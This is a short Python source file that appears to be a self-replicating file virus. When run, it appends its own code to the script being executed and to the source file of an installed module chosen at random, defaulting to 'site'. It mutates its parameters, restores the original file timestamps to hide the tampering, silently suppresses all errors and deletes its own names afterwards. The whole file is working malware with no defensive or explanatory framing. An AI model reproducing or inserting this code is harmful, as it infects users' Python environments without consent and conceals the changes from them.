genes={'minsize':3072,'target_mod':'site','cnt':0,'memory':[]}
mark="#####MyPython####"#v1.2.0

def find_code(file):
    code=''
    with open(file,encoding="utf-8") as f:
        for line in f:
            if mark in line.strip():
                code=line+f.read()
    return code

def add_memory(gene,item):
    import sys,os;mem=gene['memory']
    mem.append(item);gene['cnt']+=1
    size=sum(len(item) for item in mem);maxsize=40
    while mem and size>maxsize:
        size-=len(mem.pop(0))
def mutate(gene):
    import sys,random as r
    mut=gene.copy();mut['memory']=gene['memory'].copy()
    if r.random()<0.2:
        mut['minsize']=max(1500,mut['minsize']+round(r.gauss(0,80)))
    if (r.random()<0.1 if '__name__'=='__main__' else r.random()<0.01):
        mod=None
        while not (hasattr(sys.modules.get(mod),'__file__') \
            and sys.modules[mod].__file__.lower().endswith('.py')):
            mod=r.choice(list(sys.modules))
        mut['target_mod']=mod
    return mut

def spread_to_file(file,code):
    import os;stat=os.stat(file)
    old_time=stat.st_atime,stat.st_mtime
    with open(file,'r',encoding='utf-8') as f:
        for line in f:
            if mark in line:return
    if os.path.getsize(file)>=genes['minsize']:
        backup=genes['memory'].copy()
        add_memory(genes,os.path.split(file)[1])
        with open(file,'a',encoding='utf-8') as f:
            f.write('\ngenes=%r\n' % mutate(genes))
            f.write(code)
        os.utime(file,old_time)
        genes['memory']=backup

def spread(mod,code):
    spread_to_file(__import__(mod).__file__,code)

try:
    code=find_code(__file__)
    spread(genes['target_mod'],code)
    spread_to_file(__import__('sys').argv[0],code)
except:pass
del find_code,add_memory,mutate,spread,spread_to_file,genes,mark
try:del code
except NameError:pass
